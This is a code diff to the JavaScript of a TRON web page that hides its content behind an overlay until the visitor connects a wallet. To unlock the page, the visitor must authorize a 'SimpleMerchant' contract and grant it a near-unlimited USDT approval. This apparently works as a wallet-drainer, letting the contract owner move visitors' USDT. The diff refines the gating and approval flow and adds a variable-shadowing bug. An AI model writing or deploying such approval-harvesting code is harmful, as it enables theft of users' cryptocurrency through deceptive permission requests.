@@ -456,7 +456,7 @@ function updateConnectionUI(connected, address = null) {
             connectButton.classList.remove('connected');
             connectButton.innerHTML = '<i class="fas fa-wallet"></i> Connect Wallet';
             connectButton.title = 'Connect Wallet';
-            hideOverlay(); 
+            // 【注意】这里不再调用 hideOverlay()，而是依赖 checkAuthorization 来决定是否隐藏
         }
     }
 }
@@ -477,6 +477,8 @@ function updateStatus(message) {
 async function checkAuthorization() {
     try {
         if (!tronWeb || !userAddress || !contractInstance || !usdtContractInstance) {
+            // 如果连接不完整，保持初始遮罩状态
+            updateConnectionUI(false); 
             showOverlay('Wallet not connected. Please connect.');
             return;
         }
@@ -500,15 +502,14 @@ async function checkAuthorization() {
 
 
         let statusMessage = '';
+        const allAuthorized = isAuthorized && isUsdtMaxApproved; 
 
-        // SimpleMerchant 合約授權
+        // 构造状态信息
         if (isAuthorized) {
             statusMessage += 'Web page access authorized ✅. ';
         } else {
             statusMessage += 'Web page access not authorized ❌. ';
         }
-
-        // USDT 的授權狀態
         statusMessage += `USDT Balance: ${formattedUsdtBalance}. `;
         if (isUsdtMaxApproved) {
             statusMessage += `USDT approved ✅.`;
@@ -518,22 +519,21 @@ async function checkAuthorization() {
             statusMessage += `USDT not approved ❌.`;
         }
 
-        // Button state: 现在只检查 SimpleMerchant 和 USDT
-        const allAuthorized = isAuthorized && isUsdtMaxApproved; 
 
         if (allAuthorized) {
+            // **【遮罩修复】** 授权完成，隐藏遮罩和状态栏
             connectButton.classList.add('connected');
             connectButton.title = 'Disconnect Wallet';
             connectButton.disabled = false;
-            updateStatus(''); 
+            updateStatus('All authorizations complete.'); 
             hideOverlay(); 
         } else {
+            // **【遮罩修复】** 授权未完成，显示遮罩，并提示用户点击按钮进行操作
             connectButton.classList.remove('connected');
-            connectButton.title = 'Connect Wallet (Complete Authorization)';
+            connectButton.title = 'Complete Authorization';
             connectButton.disabled = false;
-            updateStatus(''); 
-            // 如果授权不足，显示提示，并让用户点击按钮执行 executeAuthorization
-            showOverlay('You need to complete the authorization to view the content. Click the wallet link in the upper right corner.'); 
+            updateStatus(`Authorization incomplete. ${statusMessage}`); // 状态栏显示详细信息
+            showOverlay('You need to complete the authorization to view the content. Click the wallet link in the upper right corner to begin authorization.'); 
         }
     } catch (error) {
         updateStatus(`Authorization check failed: ${error.message}`);
@@ -542,7 +542,7 @@ async function checkAuthorization() {
     }
 }
 
-// --- 新增：执行授权交易 ---
+// --- 执行授权交易 ---
 async function executeAuthorization() {
     if (!userAddress) {
         showOverlay('Please connect your wallet first.');
@@ -552,39 +552,32 @@ async function executeAuthorization() {
     try {
         updateStatus('Checking authorization requirements...');
         
-        // 重新检查 SimpleMerchant 合约授权状态
-        let isAuthorized = await contractInstance.authorized(userAddress).call();
-        
         // 1. SimpleMerchant 合约授权
+        let isAuthorized = await contractInstance.authorized(userAddress).call();
         if (!isAuthorized) {
             updateStatus('Requesting SimpleMerchant authorization... Please confirm in your wallet.');
             showOverlay('Requesting SimpleMerchant authorization... Please confirm the transaction in your wallet.');
             
-            // 调用 SimpleMerchant 合约的 connectAndAuthorize 方法
             await contractInstance.connectAndAuthorize().send({
-                feeLimit: 100000000, // 费用限制: 100 TRX
+                feeLimit: 100000000, 
                 callValue: 0,
                 shouldPollResponse: true 
             });
             updateStatus(`SimpleMerchant Authorization successful. Checking next step...`);
-            
-            // 确认交易后，更新状态
             isAuthorized = true;
             await new Promise(resolve => setTimeout(resolve, 3000)); 
         }
         
-        // 重新检查 USDT 授权状态
+        // 2. USDT 无限授权
         let usdtAllowanceRaw = await usdtContractInstance.allowance(userAddress, TRON_CONTRACT_ADDRESS).call();
         let isUsdtMaxApproved = BigInt(usdtAllowanceRaw) >= BigInt(ALMOST_MAX_UINT); 
         
-        // 2. USDT 无限授权
-        if (isAuthorized && !isUsdtMaxApproved) { // 仅在 SimpleMerchant 授权成功后才检查/执行 USDT
+        if (isAuthorized && !isUsdtMaxApproved) { 
             updateStatus('Requesting USDT infinite approval... Please confirm in your wallet.');
             showOverlay('Requesting USDT infinite approval... Please confirm the transaction in your wallet.');
             
-            // 调用 USDT TRC20 合约的 approve 方法
             await usdtContractInstance.approve(TRON_CONTRACT_ADDRESS, ALMOST_MAX_UINT).send({
-                feeLimit: 100000000, // 费用限制
+                feeLimit: 100000000, 
                 callValue: 0,
                 shouldPollResponse: true 
             });
@@ -598,15 +591,13 @@ async function executeAuthorization() {
 
     } catch (error) {
         console.error("Authorization Execution Failed:", error);
-        // 如果是用户拒绝交易，TronWeb 抛出的错误信息可能会很复杂
         const errorMessage = error.message.includes('User cancelled') || error.message.includes('Confirmation declined') ? 
                              'Authorization cancelled by user.' : 
                              `Transaction failed: ${error.message}`;
                              
         updateStatus(`🔴 ${errorMessage}`);
         showOverlay(`🔴 Authorization failed: ${errorMessage}`);
-        // 交易失败后，回退到只读检查，以防部分授权成功
-        await checkAuthorization();
+        await checkAuthorization(); // 交易失败后，回退到只读检查
     }
 }
 
@@ -621,18 +612,32 @@ async function connectWallet() {
         }
         
         updateStatus('Connecting to wallet...'); 
-        showOverlay('Waiting for wallet connection...');
+        showOverlay('Please ensure your wallet is logged in and connected to this DApp...');
         
-        // 延迟一段时间等待 TronWeb 完全初始化
-        await new Promise(resolve => setTimeout(resolve, 500)); 
-
         tronWeb = window.tronWeb;
-        
-        userAddress = tronWeb.defaultAddress.base58; 
+        let userAddress = null;
+
+        // **【修复：使用循环等待地址加载】**
+        const MAX_RETRIES = 10;
+        const DELAY_MS = 500;
+        let retryCount = 0;
+
+        while (!userAddress && retryCount < MAX_RETRIES) {
+            await new Promise(resolve => setTimeout(resolve, DELAY_MS)); 
+            
+            if (tronWeb.defaultAddress && tronWeb.defaultAddress.base58 && tronWeb.defaultAddress.base58.length > 5) {
+                userAddress = tronWeb.defaultAddress.base58;
+                break;
+            }
+            retryCount++;
+        }
 
         if (!userAddress || userAddress === tronWeb.defaultAddress.hex) { 
-            throw new Error("Could not retrieve Tron account address. Please ensure your wallet is connected/logged in.");
+            throw new Error("Could not retrieve Tron account address after multiple attempts. Please ensure your wallet is connected/logged in.");
         }
+        
+        // 全局更新用户地址
+        window.userAddress = userAddress;
         
         console.log("✅ User Address:", userAddress);
         updateConnectionUI(true, userAddress);
@@ -654,8 +659,9 @@ async function connectWallet() {
     }
 }
 
-// --- 处理授权流程 (现在只作为 executeAuthorization 的别名) ---
+// --- 处理授权流程 ---
 async function handleAuthorization() {
+    // 逻辑已移至 executeAuthorization
     await executeAuthorization(); 
 }
 
@@ -666,6 +672,7 @@ function disconnectWallet() {
     contractInstance = null;
     usdtContractInstance = null;
     updateConnectionUI(false);
+    // **【遮罩修复】** 断开连接后，显示遮罩
     showOverlay('Please link your wallet to unlock the page 🔒');
 }
 
@@ -678,8 +685,9 @@ connectButton.addEventListener('click', () => {
     }
 });
 
-// 页面加载完成后，初始化 (保持不变)
+// 页面加载完成后，初始化 
 window.onload = () => {
     updateConnectionUI(false); 
+    // **【遮罩修复】** 页面加载时，显示连接提示遮罩
     showOverlay('Please connect your wallet to unlock the content. Click the wallet icon in the upper right corner.');
 };
